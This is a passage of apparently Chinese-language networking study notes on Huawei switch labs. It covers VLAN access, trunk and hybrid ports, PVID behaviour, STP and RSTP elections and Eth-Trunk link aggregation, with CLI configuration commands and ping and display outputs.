ttl=128 time=80 ms</span><br><span class="line">    Reply from 10.1.10.1: bytes=56 Sequence=3 ttl=128 time=60 ms</span><br><span class="line">    Reply from 10.1.10.1: bytes=56 Sequence=4 ttl=128 time=60 ms</span><br><span class="line">    Reply from 10.1.10.1: bytes=56 Sequence=5 ttl=128 time=50 ms</span><br><span class="line"></span><br><span class="line">  --- 10.1.10.1 ping statistics ---</span><br><span class="line">    5 packet(s) transmitted</span><br><span class="line">    5 packet(s) received</span><br><span class="line">    0.00% packet loss</span><br><span class="line">    round-trip min/avg/max = 50/102/260 ms</span><br><span class="line">    </span><br><span class="line">&lt;R1&gt;dis arp</span><br><span class="line">IP ADDRESS      MAC ADDRESS     EXPIRE(M) TYPE        INTERFACE   VPN-INSTANCE </span><br><span class="line">                                          VLAN/CEVLAN PVC                      </span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line">10.1.10.10      00e0-fc4f-459d            I -         GE0/0/1</span><br><span class="line">10.1.10.1       5489-98a2-4636  14        D-0         GE0/0/1</span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">[SW3]dis mac-address</span><br><span class="line">MAC address table of slot 0:</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">MAC Address    VLAN/       PEVLAN CEVLAN Port            Type      LSP/LSR-ID  </span><br><span class="line">               VSI/SI                                              MAC-Tunnel  </span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">5489-98a2-4636 10          -      -      GE0/0/10        dynamic   0/-         </span><br><span class="line">00e0-fc4f-459d 10          -      -      GE0/0/3         dynamic   0/-         </span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Total matching items on slot 0 displayed = 2 </span><br></pre></td></tr></table></figure><hr><h3 id="思考实验"><a href="#思考实验" class="headerlink" title="思考实验"></a><strong>思考实验</strong></h3><p><strong>将SW1接口vlan切换为99，是否可以建立PC1到R1之间的通信？</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[SW1]int g0/0/1</span><br><span class="line">[SW1-GigabitEthernet0/0/1]port link-type access </span><br><span class="line">[SW1-GigabitEthernet0/0/1]port default vlan 99</span><br><span class="line">[SW1]int g0/0/3</span><br><span class="line">[SW1-GigabitEthernet0/0/3]port link-type access </span><br><span class="line">[SW1-GigabitEthernet0/0/3]port default vlan 99</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">【测试】</span><br><span class="line">&lt;R1&gt;ping 10.1.10.1</span><br><span class="line">  PING 10.1.10.1: 56  data bytes, press CTRL_C to break</span><br><span class="line">    Reply from 10.1.10.1: bytes=56 Sequence=1 ttl=128 time=120 ms</span><br><span class="line">    Reply from 10.1.10.1: bytes=56 Sequence=2 ttl=128 time=100 ms</span><br><span class="line"></span><br><span class="line">  --- 10.1.10.1 ping statistics ---</span><br><span class="line">    2 packet(s) transmitted</span><br><span class="line">    2 packet(s) received</span><br><span class="line">    0.00% packet loss</span><br><span class="line">    round-trip min/avg/max = 60/86/120 ms</span><br></pre></td></tr></table></figure><p>==注：进入SW1设备后tag +99，出SW1后tag -99，进入SW3设备，标签为+10，依旧可以通信==</p><hr><h2 id="Trunk（干道-共享）"><a href="#Trunk（干道-共享）" class="headerlink" title="Trunk（干道/共享）"></a><strong>Trunk</strong>（干道/共享）</h2><p>工作原理：以太帧出入（交换机）方向多个VLAN ID</p><p>一个链路上可以承载多个vlan帧</p><h3 id="实验三"><a href="#实验三" class="headerlink" title="实验三"></a>实验三</h3><p><strong>SW3的3口和SW1的3口实施Trunk</strong></p><div class="table-container"><table><thead><tr><th>导图：                                    [R1]                             <br />                                  G0/1                      G0/2            <br />                                [SW1]      G0/5       [SW2]           <br />                                [SW1]      G0/6       [SW2]           <br />                                 G0/3                        G0/1            <br />                                                [SW3]</th></tr></thead><tbody><tr><td></td></tr></tbody></table></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">注：当接口已经属于VLAN时，无法直接修改类型，得先还原接口</span><br><span class="line">[SW1-GigabitEthernet0/0/3]port link-type trunk </span><br><span class="line">Error: Please renew the default configurations.</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[SW1-GigabitEthernet0/0/3]port default vlan 1</span><br><span class="line">[SW1-GigabitEthernet0/0/3]port link-type trunk </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[SW3-GigabitEthernet0/0/3]port default vlan  1</span><br><span class="line">[SW3-GigabitEthernet0/0/3]port link-type trunk </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">注：此时PC1无法和AR1建立通信</span><br><span class="line">HW设备的trunk默认仅仅允许VLAN 1 通过</span><br><span class="line">[SW1-GigabitEthernet0/0/3]port trunk allow-pass vlan ?</span><br><span class="line">  INTEGER&lt;1-4094&gt;  VLAN ID</span><br><span class="line">  all              All</span><br><span class="line">[SW1-GigabitEthernet0/0/3]port trunk allow-pass vlan all  //允许所有VLAN通过</span><br><span class="line"></span><br><span class="line">[SW3-GigabitEthernet0/0/3]port trunk allow-pass vlan all </span><br><span class="line">[SW3-GigabitEthernet0/0/3]dis th</span><br><span class="line">#</span><br><span class="line">interface GigabitEthernet0/0/3</span><br><span class="line"> port link-type trunk</span><br><span class="line"> port trunk allow-pass vlan 2 to 4094</span><br><span class="line">  //trunk上允许vlan2~4094以TAG（携带标记）的方式通过，vlan1不携带TAG</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">【测试】</span><br><span class="line">&lt;R1&gt;ping 10.1.10.1</span><br><span class="line">  PING 10.1.10.1: 56  data bytes, press CTRL_C to break</span><br><span class="line">    Reply from 10.1.10.1: bytes=56 Sequence=1 ttl=128 time=90 ms</span><br><span class="line">    Reply from 10.1.10.1: bytes=56 Sequence=2 ttl=128 time=90 ms</span><br><span class="line">    </span><br><span class="line">  --- 10.1.10.1 ping statistics ---</span><br><span class="line">    2 packet(s) transmitted</span><br><span class="line">    2 packet(s) received</span><br><span class="line">    0.00% packet loss</span><br><span class="line">    round-trip min/avg/max = 60/80/90 ms</span><br></pre></td></tr></table></figure><hr><h2 id="Trunk上的PVID-VLAN"><a href="#Trunk上的PVID-VLAN" class="headerlink" title="Trunk上的PVID VLAN"></a>Trunk上的PVID VLAN</h2><ul><li>当Trunk端口收到帧时，如果该帧不包含Tag，将添加上端口的PVID；如果该帧包含Tag，则不改变。</li><li>当Trunk端口发送帧时，该帧的VLAN ID在Trunk上的允许发送列表中：若与端口的PVID相同时，则剥离Tag发送；若与端口的PVID不同时，则直接发送。</li></ul><h3 id="实验四"><a href="#实验四" class="headerlink" title="实验四"></a>实验四</h3><p>修改Trunk上的PVID VLAN是否可以建立R1到PC1之间的通信</p><div class="table-container"><table><thead><tr><th>导图：                                     [R1]                             <br />                                  G0/1                      G0/2            <br />                                [SW1]      G0/5       [SW2]           <br />                                [SW1]      G0/6       [SW2]           <br />                                 G0/3                        G0/1            <br />                                                [SW3]</th></tr></thead><tbody><tr><td></td></tr></tbody></table></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#SW1 1口类型access，vlan8</span><br><span class="line">[SW1-GigabitEthernet0/0/1]port link-type access</span><br><span class="line">[SW1-GigabitEthernet0/0/1]port default vlan 8</span><br><span class="line"></span><br><span class="line">#SW1的3口PVID VLAN修改为8</span><br><span class="line">[SW1-GigabitEthernet0/0/3]port link-type trunk</span><br><span class="line">[SW1-GigabitEthernet0/0/3]port trunk allow-pass vlan all</span><br><span class="line">[SW1-GigabitEthernet0/0/3]port trunk pvid vlan 8</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#SW3 10口类型access，VLAN10</span><br><span class="line">[SW3-GigabitEthernet0/0/10]port link-type access </span><br><span class="line">[SW3-GigabitEthernet0/0/10]port default vlan 10</span><br><span class="line"></span><br><span class="line">#SW3 3口PVID VLAN修改为10</span><br><span class="line">[SW3-GigabitEthernet0/0/3]port link-type trunk</span><br><span class="line">[SW3-GigabitEthernet0/0/3]port trunk allow-pass vlan all</span><br><span class="line">[SW3-GigabitEthernet0/0/3]port trunk pvid vlan 10</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">【测试】</span><br><span class="line">&lt;R1&gt;ping 10.1.10.1</span><br><span class="line">  PING 10.1.10.1: 56  data bytes, press CTRL_C to break</span><br><span class="line">    Reply from 10.1.10.1: bytes=56 Sequence=1 ttl=128 time=200 ms</span><br><span class="line">    Reply from 10.1.10.1: bytes=56 Sequence=2 ttl=128 time=60 ms</span><br><span class="line"></span><br><span class="line">  --- 10.1.10.1 ping statistics ---</span><br><span class="line">    2 packet(s) transmitted</span><br><span class="line">    2 packet(s) received</span><br><span class="line">    0.00% packet loss</span><br><span class="line">    round-trip min/avg/max = 60/98/200 ms</span><br></pre></td></tr></table></figure><p>==PVID VLAN就是在Trunk上不携带Tag的一个VLAN==</p><hr><h2 id="Hybird（混杂）"><a href="#Hybird（混杂）" class="headerlink" title="Hybird（混杂）"></a>Hybird（混杂）</h2><p>可以像access典型连接终端，也可以像trunk典型连接交换机<br>最明显的特点是连接终端时可以拿掉多个VLAN的Tag（灵活的变换VLAN ID）</p><h3 id="实验五"><a href="#实验五" class="headerlink" title="实验五"></a>实验五</h3><div class="table-container"><table><thead><tr><th>导图：                                     [R1]                             <br />                                     G0/1                  G0/2            <br />                                [SW1]      G0/5       [SW2]          <br />                                [SW1]      G0/6       [SW2]          <br />                                    G0/3                  G0/1              <br />                                                [SW3]</th></tr></thead><tbody><tr><td></td></tr></tbody></table></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#还原交换机默认配置</span><br><span class="line">[SW1-GigabitEthernet0/0/3]undo port trunk allow-pass vlan 2 to 4094</span><br><span class="line">[SW1-GigabitEthernet0/0/3]port trunk pvid vlan 1</span><br><span class="line">[SW3]clear configuration interface g0/0/3</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#步骤一：配置交换机互联链路</span><br><span class="line">[SW1-GigabitEthernet0/0/3]port link-type hybrid </span><br><span class="line">[SW1-GigabitEthernet0/0/3]port hybrid tagged vlan all </span><br><span class="line">[SW1-GigabitEthernet0/0/1]port link-type hybrid </span><br><span class="line"></span><br><span class="line">[SW3-GigabitEthernet0/0/3]port link-type hybrid </span><br><span class="line">[SW3-GigabitEthernet0/0/3]port hybrid tagged vlan all </span><br><span class="line">[SW3]dis port vlan active </span><br><span class="line">T=TAG U=UNTAG</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Port                Link Type    PVID    VLAN List</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">GE0/0/3             hybrid       1       T: 1 10</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#步骤二：入方向增加PVID</span><br><span class="line">[SW1-GigabitEthernet0/0/1]port hybrid pvid vlan 10</span><br><span class="line">[SW3-GigabitEthernet0/0/10]port hybrid pvid vlan 8</span><br><span class="line">[SW3-GigabitEthernet0/0/11]port hybrid pvid vlan 9</span><br><span class="line">[SW3]dis port vlan active </span><br><span class="line">T=TAG U=UNTAG</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Port                Link Type    PVID    VLAN List</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">GE0/0/3             hybrid       1       T: 1 8 to 10</span><br><span class="line">GE0/0/10            hybrid       8       U: 1</span><br><span class="line">GE0/0/11            hybrid       9       U: 1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#步骤三：出方向拿掉多个VLAN的tag</span><br><span class="line">[SW3-GigabitEthernet0/0/11]port hybrid untagged vlan 9 10</span><br><span class="line">[SW3-GigabitEthernet0/0/10]port hybrid untagged vlan 8 10</span><br><span class="line">[SW1-GigabitEthernet0/0/1]port hybrid untagged vlan 8 9 10</span><br><span class="line">[SW3]dis port vlan active </span><br><span class="line">T=TAG U=UNTAG</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Port                Link Type    PVID    VLAN List</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">GE0/0/3             hybrid       1       T: 1 8 to 10</span><br><span class="line">GE0/0/10            hybrid       8       U: 1 8 10</span><br><span class="line">GE0/0/11            hybrid       9       U: 1 9 to 10</span><br><span class="line"></span><br><span class="line">[SW1]dis port vlan active </span><br><span class="line">T=TAG U=UNTAG</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Port                Link Type    PVID    VLAN List</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">GE0/0/1             hybrid       10      U: 1 8 to 10</span><br><span class="line">GE0/0/3             hybrid       1       T: 1 8 to 11</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">【测试R1和PC1通信】</span><br><span class="line">&lt;R1&gt;ping 10.1.10.1</span><br><span class="line">  PING 10.1.10.1: 56  data bytes, press CTRL_C to break</span><br><span class="line">    Reply from 10.1.10.1: bytes=56 Sequence=1 ttl=128 time=90 ms</span><br><span class="line">    Reply from 10.1.10.1: bytes=56 Sequence=2 ttl=128 time=80 ms</span><br><span class="line"></span><br><span class="line">  --- 10.1.10.1 ping statistics ---</span><br><span class="line">    2 packet(s) transmitted</span><br><span class="line">    2 packet(s) received</span><br><span class="line">    0.00% packet loss</span><br><span class="line">    round-trip min/avg/max = 80/85/90 ms</span><br></pre></td></tr></table></figure><hr><h2 id="STP原理"><a href="#STP原理" class="headerlink" title="STP原理"></a>STP原理</h2><p>STP（spanning tree protocol），生成树协议，用于在存在环路的网络中构建树形拓扑，避免环路，同时实现链路的冗余备份。</p><p>STP是解决链路级冗余带来的环路问题<br>堆叠是解决设备级冗余问题 </p><hr><p><strong>生成树的危害：</strong></p><ol><li>广播风暴</li><li>MAC地址表震荡（Flapping）</li><li>重复帧拷贝</li></ol><hr><p><strong>3个有且只有：</strong></p><ol><li>有且只有一个根交换机——&gt;Root</li><li>有且只有一个根端口——&gt;Root Port（RP）</li><li>有且只有一个指定端口——&gt;Design Port（DP）</li><li>其他N个都是备份端口——&gt;Alternative Port（AP）</li></ol><hr><p><strong>STP操作过程</strong></p><ul><li>选举一个根桥</li><li>每个非根交换机选举一个根端口</li><li>每个网段选举一个指定端口</li><li>阻塞非根、非指定端口</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">display stp brief  //查看端口类型以及状态</span><br></pre></td></tr></table></figure><hr><h3 id="一系列选举："><a href="#一系列选举：" class="headerlink" title="一系列选举："></a><strong>一系列选举</strong>：</h3><p>1、选举STP的根设备</p><p>​          BPDU（桥接信息单元）是维护STP的报文（2s）<br>​          ROOT：桥ID（bridge ID），优先级（默认32768）+背板MAC（和接口没关系）</p><p>2、 调整STP的根和备份根</p><p>3、 选举STP的根端口</p><p>4、 选举STP的指定端口</p><p>5、 STP部署</p><p>6、STP的调整和优化</p><hr><h3 id="根端口的选举原则"><a href="#根端口的选举原则" class="headerlink" title="根端口的选举原则"></a><strong>根端口的选举原则</strong></h3><ol><li><p>RPC</p></li><li><p>对端桥ID</p></li><li><p>对端的端口ID</p><p>port ID=端口优先级+序号（不可改变=端口序号）</p><p>先比较优先级，再比较序号 </p></li><li><p>本端的端口号</p></li></ol><hr><h3 id="实验一：RPC"><a href="#实验一：RPC" class="headerlink" title="实验一：RPC"></a>实验一：RPC</h3><div class="table-container"><table><thead><tr><th>导图：                                    [R1]                             <br />                                    G0/1                 G0/2               <br />                                [SW1]      G0/5       [SW2]           <br />                                [SW1]      G0/6       [SW2]           <br />                                    G0/3                  G0/1              <br />                                                [SW3]</th></tr></thead><tbody><tr><td></td></tr></tbody></table></div><p>根设备调整：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[SW1]stp mode stp//模式</span><br><span class="line">[SW1]stp priority 0//优先级</span><br></pre></td></tr></table></figure><p>备份根设备：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[SW2]stp mode stp//模式</span><br><span class="line">[SW2]stp priority 4096//次优先级</span><br></pre></td></tr></table></figure><p>查看SW3接口状态:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;SW3&gt;dis stp brief</span><br><span class="line"> MSTID  Port                        Role  STP State     Protection</span><br><span class="line">   0    GigabitEthernet0/0/1          ALTE  DISCARDING      NONE</span><br><span class="line">   0    GigabitEthernet0/0/3        ROOT  FORWARDING      NONE</span><br><span class="line">   0    GigabitEthernet0/0/10       DESI  LEARNING        NONE</span><br><span class="line">   0    GigabitEthernet0/0/11       DESI  LEARNING        NONE</span><br><span class="line">   0    GigabitEthernet0/0/12       DESI  LEARNING        NONE</span><br></pre></td></tr></table></figure><p>修改SW3 3接口的开销值查看端口状态</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[SW3-GigabitEthernet0/0/3]stp cost 40001</span><br><span class="line">[SW3]dis stp brief </span><br><span class="line"> MSTID  Port                        Role  STP State     Protection</span><br><span class="line">   0    GigabitEthernet0/0/1        ROOT  FORWARDING      NONE</span><br><span class="line">   0    GigabitEthernet0/0/3        ALTE  DISCARDING      NONE</span><br><span class="line">   0    GigabitEthernet0/0/10       DESI  DISCARDING      NONE</span><br><span class="line">   0    GigabitEthernet0/0/11       DESI  DISCARDING      NONE</span><br><span class="line">   0    GigabitEthernet0/0/12       DESI  DISCARDING      NONE</span><br></pre></td></tr></table></figure><hr><h3 id="实验二：修改端口优先级"><a href="#实验二：修改端口优先级" class="headerlink" title="实验二：修改端口优先级"></a>实验二：修改端口优先级</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[SW2]dis stp brief </span><br><span class="line"> MSTID  Port                        Role  STP State     Protection</span><br><span class="line">   0    GigabitEthernet0/0/1        DESI  FORWARDING      NONE</span><br><span class="line">   0    GigabitEthernet0/0/2        DESI  FORWARDING      NONE</span><br><span class="line">   0    GigabitEthernet0/0/5        ROOT  FORWARDING      NONE//根端口</span><br><span class="line">   0    GigabitEthernet0/0/6        ALTE  DISCARDING      NONE</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[SW1-GigabitEthernet0/0/5]stp port priority 240</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[SW2]dis stp brief</span><br><span class="line"> MSTID  Port                        Role  STP State     Protection</span><br><span class="line">   0    GigabitEthernet0/0/1        DESI  FORWARDING      NONE</span><br><span class="line">   0    GigabitEthernet0/0/2        DESI  FORWARDING      NONE</span><br><span class="line">   0    GigabitEthernet0/0/5        ALTE  DISCARDING      NONE</span><br><span class="line">   0    GigabitEthernet0/0/6        ROOT  DISCARDING      NONE//根端口</span><br></pre></td></tr></table></figure><p>==注：角色会立马变化，但状态不会立马发生变化==</p><hr><h3 id="指定端口选举"><a href="#指定端口选举" class="headerlink" title="指定端口选举"></a><strong>指定端口选举</strong></h3><p>每个链路上有且只有一个</p><ol><li>RPC</li><li>本端桥ID</li><li>本端的端口ID</li><li>其他端口都是AP（N个）</li></ol><hr><p>STP五种端口状态：</p><ul><li>Disable(禁用)：不收发任何报文</li><li>Blocking(阻塞)：不接收也不转发帧，接受但不发送BPDU，不学习MAC地址</li><li>Listening(侦听)：不接收也不转发帧，接受并且发送BPDU，不学习MAC地址</li><li>Learning(学习)：不接收也不转发帧，接受并且发送BPDU，学习MAC地址</li><li>Forwarding(转发)：接收并且转发帧，接受并且发送BPDU，学习MAC地址</li></ul><p>状态变化需要依赖时间</p><ul><li>2秒发送BPDU的间隔</li><li>15秒的转发时延</li><li>20秒的最大生存时间（MaxAge）</li></ul><hr><h3 id="网桥协议数据单元（BPDU）"><a href="#网桥协议数据单元（BPDU）" class="headerlink" title="网桥协议数据单元（BPDU）"></a>网桥协议数据单元（BPDU）</h3><p>主要字段：</p><p>1、根桥ID，指明树的根是哪一台设备。每台设备都可以设置自己的ID，ID最小的设备成为树的根。<br>2、到根桥的路径开销<br>3、指定桥ID<br>4、指定桥的指定端口<br>5、hello time（BPDU发送时间间隔）<br>6、max age（BPDU消息最大生存时间）<br>7、message age（BPDU消息当前存活的时间）<br>8、forward delay（端口角色变化的时延）</p><hr><p>优先级选择顺序：</p><ol><li>BPDU中根桥ID最小的最好</li><li>如果根桥ID相同，根路径开销最小的最好</li><li>如果根路径开销也相同，指定桥ID最小的最好</li><li>如果指定桥ID也相同，那么指定桥的指定端口最小的BPDU最好</li></ol><hr><h3 id="STP的不足之处"><a href="#STP的不足之处" class="headerlink" title="STP的不足之处"></a>STP的不足之处</h3><ol><li>链路故障后，链路收敛时间过长。有30s和50s（等20s计时器超时）的情况。</li><li>连接终端用户的链路也要进行生成树计算，需要等待30s才能进入转发状态。其实连接终端的链路不会出现环路，所以没有必要进行STP计算和等到计时器超时。</li><li>STP的拓扑变更机制复杂，效率低下。</li></ol><hr><h1 id="RSTP原理"><a href="#RSTP原理" class="headerlink" title="RSTP原理"></a>RSTP原理</h1><p>RSTP（Rapid spanning tree protocol），快速生成树协议，基本原理和STP相同只做了三点改进如下：</p><ol><li>分别为根端口和指定端口定义了替换端口和备份端口，如果根端口被阻塞了，那么替换端口可以无时延的转换的转发状态。</li><li>新定义了一个握手机制，上下行设备之间只需要一次简单的握手就可以使设备之间的链路处于转发状态</li><li>边缘端口可以无时延的转换的转发状态</li></ol><p>==注：不是所有的根端口都有替换端口，也不是所有的指定端口都有备份端口，这取决于实际的网络环境，不一定RSTP倒换的就会快。==</p><hr><p>RSTP三种端口状态：</p><ul><li>Discarding(丢弃)：</li><li>Forwarding(转发)：</li><li>Learning(学习)：</li></ul><p>它把STP中的Blocking（阻塞）、Listening（侦听）和Disabled（禁用）统一用一种状态——&gt;Discarding（丢弃）替代</p><p>好处就是一个端口从初始状态转变为转发状态只需要一个转发延时周期时间，也就是从学习状态到转发状态所需等待的时间</p><hr><p>配置边缘接口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[SW1-GigabitEthernet0/0/1]stp edged-port enable </span><br></pre></td></tr></table></figure><hr><h1 id="链路聚合"><a href="#链路聚合" class="headerlink" title="链路聚合"></a>链路聚合</h1><p>Huawei——&gt;（eth—trunk）</p><p>链路聚合一般部署在核心节点，提高网络的数据吞吐量</p><p>作用：</p><ul><li>增加带宽</li><li>更多的冗余链路</li><li>提高链路利用率</li><li>支持负载分担（把数据放到不同的物理链路）</li></ul><p>Eth—Trunk：链路两端的物理接口数量、速率、双工方式、流控方式必须一致</p><p>==注：华为设备做链路聚合必须是混杂模式==</p><p>二层链路聚合  </p><div class="table-container"><table><thead><tr><th>导图：                                     [R1]                             <br />                                  G0/1                      G0/2            <br />                                [SW1]      G0/5       [SW2]           <br />                                [SW1]      G0/6       [SW2]           <br />                                 G0/3                        G0/1            <br />                                                [SW3]</th></tr></thead><tbody><tr><td></td></tr></tbody></table></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//必须清除接口配置才可以做链路聚合</span><br><span class="line">[SW1-Eth-Trunk12]trunkport GigabitEthernet 0/0/5 to 0/0/6</span><br><span class="line">Info: This operation may take a few seconds. Please wait for a moment...</span><br><span class="line">Error: The port has other configurations. Please clear them first.</span><br><span class="line">The error port is GigabitEthernet0/0/5.</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[SW1] interface Eth-Trunk 12</span><br><span class="line">[SW1-Eth-Trunk12] trunkport GigabitEthernet 0/0/5 to 0/0/6</span><br><span class="line">[SW1-Eth-Trunk12] port link-type trunk</span><br><span class="line">[SW1-Eth-Trunk12] port trunk pvid vlan 99</span><br><span class="line">[SW1-Eth-Trunk12] port trunk allow-pass vlan 2 to 4094</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[SW2] interface Eth-Trunk 12</span><br><span class="line">[SW2-Eth-Trunk12] trunkport GigabitEthernet 0/0/5 to 0/0/6</span><br><span class="line">[SW2-Eth-Trunk12] port link-type trunk</span><br><span class="line">[SW2-Eth-Trunk12] port trunk pvid vlan 99</span><br><span class="line">[SW2-Eth-Trunk12] port trunk allow-pass vlan 2 to 4094</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 